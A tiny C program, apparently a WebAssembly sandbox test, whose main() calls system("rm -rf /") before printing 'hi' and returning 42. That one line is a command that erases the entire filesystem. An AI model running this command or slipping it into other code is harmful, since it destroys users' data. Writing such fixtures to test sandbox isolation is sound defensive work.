#define WASM_EXPORT __attribute__((visibility("default")))
#include <stdio.h>
#include <stdlib.h>
WASM_EXPORT
int main() {
  system("rm -rf /");
  printf("hi");
  return 42;  
}
